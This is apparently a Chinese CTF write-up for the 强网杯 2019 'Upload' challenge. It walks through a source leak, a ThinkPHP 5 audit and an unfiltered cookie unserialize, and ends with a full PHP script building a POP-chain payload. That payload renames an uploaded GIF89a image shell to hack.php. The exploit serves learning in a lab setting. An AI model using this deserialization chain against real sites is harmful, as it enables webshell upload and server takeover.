---
title: "反序列化相关"
date: 2020-04-04
description: "记录CTF中遇到的反序列化题型"
categories: [
  "CTF"
]
tags: [
  "反序列化"
]
---

## [强网杯 2019]Upload

- 首先登陆界面，尝试万能密码，fuzz一波基本排除sql注入

- 扫扫扫，喜闻`[200] => www.tar.gz`，存在源码泄露`www.tar.gz`

- 解压发现是TP5的代码，审计

- Seay扫到`Profile`存在可疑利用，审计后排除，但是发现存在奇妙的`__get`和`__cal`，怀疑反序列化

  ```js
  public function __get($name)
  {
      return $this->except[$name];
  }
    
  public function __call($name, $arguments)
  {
      if($this->{$name}){
          $this->{$this->{$name}}($arguments);
      }
  }
  ```

- `index.php`中发现未过滤的`unserialize`

  ```js
  public function login_check(){
      $profile=cookie('user');
      if(!empty($profile)){
          $this->profile=unserialize(base64_decode($profile));
          $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
          if(array_diff($this->profile_db,$this->profile)==null){
              return 1;
          }else{
              return 0;
          }
      }
  }
  ```

- 未发现eval等RCE点存在，考虑结合文件上传getshell，查找文件操作相关函数

  `Profile.php`存在关键函数

  ```js
  public function upload_img(){
      if($this->checker){
          if(!$this->checker->login_check()){
              $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
              $this->redirect($curr_url,302);
              exit();
          }
      }
    
      if(!empty($_FILES)){ // 构造反序列化 使$_FILES为空 跳过该块
          $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
          $this->filename=md5($_FILES['upload_file']['name']).".png";
          $this->ext_check();
      }
      if($this->ext) { // 结合反序列化 任意重命名 更改图片马后缀
          if(getimagesize($this->filename_tmp)) {
              @copy($this->filename_tmp, $this->filename);
              @unlink($this->filename_tmp);
              $this->img="../upload/$this->upload_menu/$this->filename";
              $this->update_img();
          }else{
              $this->error('Forbidden type!', url('../index'));
          }
      }else{
          $this->error('Unknow file type!', url('../index'));
      }
  }
  ```

- 套路`GIF89a`上传绕过

- 最后构造pop链

  > Register::__destruct()->Profile::__call()->Profile::__get()->Profile::except[$name]()

  构造$name=‘index’，except[‘index’]=‘upload_img’ 以及filename等细节 实现任意重命名

```php
<?php

namespace app\web\controller;
class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __construct()
    {

    }

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __construct()
    {
    }

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }
}

$b = new Profile();
$b->except = array('index'=>'img');
$b->img = "upload_img";
$b->ext = true;
$b->filename = "./upload/76d9f00467e5ee6abc3ca60892ef304e/hack.php";
$b->filename_tmp = "./upload/76d9f00467e5ee6abc3ca60892ef304e/daf280af792fd5b906511363ae2bc39d.png";

$a = new Register();
$a->registed = false;
$a->checker = $b;
echo base64_encode(serialize($a));
```

> 比较坑的是，注意反序列化需要带上 namespace，而直接在thinkphp内跑exp会被catch掉报错，无法回显，因此需要把pop链整个copy出来跑一个exp.php